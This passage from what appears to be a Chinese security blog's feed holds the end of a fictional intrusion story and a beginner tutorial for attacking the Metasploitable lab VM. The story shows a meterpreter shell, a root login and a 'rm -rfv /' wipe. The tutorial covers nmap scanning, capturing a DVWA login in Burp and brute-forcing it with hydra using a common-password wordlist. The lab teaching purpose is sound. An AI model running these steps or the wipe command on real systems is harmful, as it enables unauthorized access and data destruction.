<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span><span class="line"><span class="cl">Process 1376 created.
</span></span><span class="line"><span class="cl">Channel 2 created.
</span></span></code></pre></td></tr></table>
</div>
</div><p>获得交互 shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/bin/sh -i
</span></span><span class="line"><span class="cl">sh: no job control in this shell
</span></span><span class="line"><span class="cl">sh-4.1$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>进行登录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">bash-4.1$ su root
</span></span><span class="line"><span class="cl">su root
</span></span><span class="line"><span class="cl">Password: ************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见，一口气便登录成功，root 权限到了他的手里。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">[root@localhost upload]# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来他便可以为所欲为了..</p>
<p>对，他最后进行了删库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# rm -rfv /
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后导致公司损失巨大..</p>
<h2 id="结语">结语</h2>
<p>虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。</p>
<p>但却值得我们思考，就我们能看到的来看&hellip;</p>
<ul>
<li>系统不更新容易被攻击</li>
<li>代码不更新容易出漏洞</li>
<li>密码更新太慢容易泄露</li>
<li>漏洞以更新来修复，不修则被利用</li>
</ul>
<p>而我们看不到的&hellip;</p>
<p>软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？</p>
<p>不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。</p>
<p>而不能站立不动甚至往回走。</p>
<p>物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。</p>
<p>甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..</p>
<p>以上，只是个人想法，若有不当之处，请在下面的评论插件中 <del>喷我</del> 纠正。</p>
]]></description>
</item><item>
    <title>锏幕 新人测试教程</title>
    <link>http://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/</link>
    <pubDate>Sun, 20 Oct 2019 23:44:37 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-6ql7el.jpg" referrerpolicy="no-referrer">
            </div><p><strong>注意事项：本期内容中的IP地址可能与你的实际情况不同！！请根据实际情况更改对应IP地址！！</strong></p>
<h2 id="开场白">开场白</h2>
<p>诶嘿～！我又回来了，我看到很多萌新不知道怎么过锏幕的新人测试，特意为此写篇博客做个教程。</p>
<p>好让你们看完过一下，那么…</p>
<p>嘛.. 我们开始吧..</p>
<h2 id="考核内容">考核内容</h2>
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th style="text-align:left">内容</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">名称</td>
<td style="text-align:left">锏幕四项萌新考核</td>
<td style="text-align:left">考核的名称</td>
</tr>
<tr>
<td style="text-align:center">难度</td>
<td style="text-align:left">Low</td>
<td style="text-align:left">难度系数</td>
</tr>
<tr>
<td style="text-align:center">第一关</td>
<td style="text-align:left">简单破解Web表单</td>
<td style="text-align:left">必须通过，否则无法进行下一关</td>
</tr>
<tr>
<td style="text-align:center">第二关</td>
<td style="text-align:left">简单SQL注入</td>
<td style="text-align:left">必须通过</td>
</tr>
<tr>
<td style="text-align:center">第三关</td>
<td style="text-align:left">操作系统渗透</td>
<td style="text-align:left">必须通过</td>
</tr>
<tr>
<td style="text-align:center">第四关</td>
<td style="text-align:left">获取root权限</td>
<td style="text-align:left">必须通过</td>
</tr>
</tbody>
</table>
<p><strong>PS：锏幕组织的新人考核是以metasploitable作为标准的，因此我会写出如何准备环境</strong></p>
<h2 id="环境准备">环境准备</h2>
<p>上面已经说明了需要用到<strong>metasploitable</strong>，那么接下来我会写出如何配置靶机环境</p>
<h3 id="第一步下载解压">第一步|下载&amp;解压</h3>
<p>首先我们需要去下载metasploitable这个靶机套餐的虚拟机文件，我们可以在各种搜索引擎中找到它我这里会给出地址。</p>
<p><a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener noreffer">点击这里可以下载</a></p>
<p>点进去以后点击那个巨大的<strong>Download</strong>即可下载。</p>
<p>嘛..我已经下载好了，是个<strong>zip</strong>文件。</p>
<p>然后你需要解压，两种方法:</p>
<ul>
<li>Linux
<ul>
<li>unzip命令</li>
<li>file-roller(GUI)</li>
</ul>
</li>
<li>Windows
<ul>
<li>各种解压软件</li>
</ul>
</li>
</ul>
<p>这个不用多说吧..</p>
<p><strong>解压个东西都不会还想加入锏幕?</strong></p>
<p></p>
<p>解压完了就可以进行下一步了。</p>
<h3 id="第二步创建虚拟机">第二步|创建虚拟机</h3>
<p>你打开文件夹就可以看到这里面有个虚拟机配置文件和一个虚拟硬盘文件，它可以直接用VMware导入运行，因此我这里给出VirtualBox的方法</p>
<p>首先，打开你的VirtualBox</p>
<p></p>
<p>然后点击上面的新建…(这个还要教吗?)</p>
<p></p>
<p>然后选择的虚拟机类型和操作系统版本，<strong>这里要注意！！必须选“64位的其他Linux”，并且设置至少256MB的内存！否则无法启动！</strong>
</p>
<p></p>
<p>然后这里就<strong>不用创建虚拟硬盘</strong>了，我们选择<strong>使用现有的虚拟硬盘文件</strong>。</p>
<p></p>
<p>点击这个东西，</p>
<p></p>
<p>然后点击<strong>注册</strong></p>
<p></p>
<p>找到你的<strong>metasploitable</strong>目录并且找到这个<strong>vmdk文件</strong>，这个就是虚拟硬盘文件。</p>
<p></p>
<p>点击打开，然后就会回到这个窗口，选择你刚刚注册的虚拟硬盘。</p>
<p></p>
<p>接下来就可以创建了</p>
<p></p>
<p><strong>在启动之前要把虚拟机的联网改成桥接</strong></p>
<p><strong>依次点击设置——网络</strong></p>
<p>然后就会跳出这个页面</p>
<p></p>
<p>将它改成桥接网卡即可</p>
<p></p>
<p>最后启动虚拟机，你的靶机环境就搭建完成了。

</p>
<p>开机之后<strong>不要去操作靶机</strong>也<strong>不要去理会它</strong></p>
<p></p>
<h2 id="考核过程">考核过程</h2>
<p>现在环境已经准备完毕了，我们可以开始进行过关了。接下来请<strong>认真看！认真看！认真看！</strong>（重要的事情说三遍）</p>
<h3 id="嗅探扫描">嗅探！扫描！</h3>
<p>我们刚刚搭建完靶机却不知道它的<strong>IP地址</strong>，这意味着我们不知道<strong>它的位置</strong>，那么怎么办呢？这个时候我们要用到<strong>nmap</strong>把他扫出来。</p>
<p>不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是<code>192.168.0.1/24</code></p>
<p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -v -O 192.168.0.1/24
</span></span><span class="line"><span class="cl">!<span class="o">[](</span>/img/截图_2019-10-20_06-27-08.png<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现它很快就扫出来了</p>
<p></p>
<p>终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.107
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 977 closed ports
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp   open  ftp
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl">23/tcp   open  telnet
</span></span><span class="line"><span class="cl">25/tcp   open  smtp
</span></span><span class="line"><span class="cl">53/tcp   open  domain
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl">111/tcp  open  rpcbind
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
</span></span><span class="line"><span class="cl">512/tcp  open  exec
</span></span><span class="line"><span class="cl">513/tcp  open  login
</span></span><span class="line"><span class="cl">514/tcp  open  shell
</span></span><span class="line"><span class="cl">1099/tcp open  rmiregistry
</span></span><span class="line"><span class="cl">1524/tcp open  ingreslock
</span></span><span class="line"><span class="cl">2049/tcp open  nfs
</span></span><span class="line"><span class="cl">2121/tcp open  ccproxy-ftp
</span></span><span class="line"><span class="cl">3306/tcp open  mysql
</span></span><span class="line"><span class="cl">5432/tcp open  postgresql
</span></span><span class="line"><span class="cl">5900/tcp open  vnc
</span></span><span class="line"><span class="cl">6000/tcp open  X11
</span></span><span class="line"><span class="cl">6667/tcp open  irc
</span></span><span class="line"><span class="cl">8009/tcp open  ajp13
</span></span><span class="line"><span class="cl">8180/tcp open  unknown
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:3F:40:18 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.9 - 2.6.33
</span></span><span class="line"><span class="cl">Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=192 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span></code></pre></td></tr></table>
</div>
</div><p>那么我已经找到靶机了，接下来就可以正式进行攻击了。</p>
<h3 id="第一关简单破解web表单">第一关|简单破解Web表单</h3>
<p>接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。</p>
<p></p>
<blockquote>
<p>小白：唔？为什么你的IP不是上面写的107了，变成4了</p>
<p>回答：我写着写着就断网了，搭建了一个虚拟局域网，所以靶机IP变了，又重新扫了一遍。。但是正常情况下，这个IP是不会变的，所以请无视这个地址具体是多少了，每个人都不一样的。</p>
</blockquote>
<p>接下来我们点击<strong>DVWA</strong>，进入了一个这样的帐号密码登录页面，我们第一关的目的就是破解它。</p>
<p></p>
<p>QwQ，然后..是不是到这里就一脸懵逼了</p>
<h4 id="抓包">抓包</h4>
<p>嘛，记得<strong>Burpsuite</strong>吗？</p>
<p>就是一个java写的软件</p>
<p></p>
<p>试试？</p>
<p>在使用Burpsuite之前，你需要给浏览器设置burp的代理，我这里使用的是firefox</p>
<p>那么，在burpsuite里面依次点击</p>
<p><code>Proxy（左上角内个）——Options</code></p>
<p></p>
<p>从这里我们就获得了burp默认的代理地址<code>127.0.0.1:8080</code></p>
<p>接下来要到浏览器里设置它，</p>
<p>简单地给出截图吧</p>
<p></p>
<p></p>
<p>然后点确定，就这样设置好了</p>
<p>嘛…<strong>浏览器都不会用</strong>的也别来锏幕了</p>
<p>然后回到burp，确认一下这个<strong>Intercept</strong>是否为<strong>on</strong>，如果是就进行下一步操作，如果不是就点一下。。。</p>
<p></p>
<p>接下来，回到浏览器</p>
<p></p>
<p>emmmm….我们知道一般网站的默认管理员帐号都是<strong>admin</strong>，这里也不例外，接下来我们试着在Username这个框框里输入<code>admin</code>，<strong>Password</strong>这个框框里随便输入点什么</p>
<p></p>
<p>然后点击<strong>login</strong>。</p>
<p>接下来我们就抓取到了这个数据包了，下面还有我输入过的信息</p>
<p></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/dvwa/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.0.4</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">46</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://192.168.0.4/dvwa/login.php</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">username=admin&amp;password=6666666666&amp;Login=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛…这么一大堆看着都头晕</p>
<p>诶嘿，其实这里你只需要保存这一部分就可以了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username=admin&amp;password=6666666666&amp;Login=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，上面这点还不够呢，还需要获取一段信息。</p>
<p>现在网页看起来像时间停止了一样一动不动的对不对？</p>
<p>那么我来解释一下burp这里三个按钮的意思</p>
<ul>
<li>Forward:放行，让网页继续执行抓到的数据包</li>
<li>Drop:丢弃，将这个数据包扔了，网页就执行不了了</li>
</ul>
<p>现在，我们点击<code>Forward</code>，放行这个数据包</p>
<p>这时，网页下面弹出了一段字符串</p>
<p></p>
<p>码下来，一会儿要用到的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Login failed
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。</p>
<p>嗯…整个抓包的过程就完成了。然后就是进行<strong>爆破</strong>了</p>
<h4 id="爆破">爆破</h4>
<p>嘛…最精彩的部分来了</p>
<p>你知道<strong>hydra</strong>吗？如果不知道那么请出门左转用搜索引擎查一下。</p>
<p>我们要给hydra设置这么几个参数</p>
<ul>
<li>-l + 用户名 : 这个是设置需要破解的用户名，我们尝试admin</li>
<li>-P 密码字典 : 指定一个txt文件，里面都是依次猜测需要的密码</li>
<li>-V : 显示详细过程</li>
<li>-n es : 尝试空口令登录</li>
<li>IP地址 : 也就是目标的地址咯，上面的<code>192.168.0.4</code></li>
<li>http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">12345
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">Password
</span></span><span class="line"><span class="cl">iloveyou
</span></span><span class="line"><span class="cl">princess
</span></span><span class="line"><span class="cl">rockyou
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">12345678
</span></span><span class="line"><span class="cl">abc123
</span></span><span class="line"><span class="cl">admin888
</span></span><span class="line"><span class="cl">admin123
</span></span><span class="line"><span class="cl">test
</span></span><span class="line"><span class="cl">password
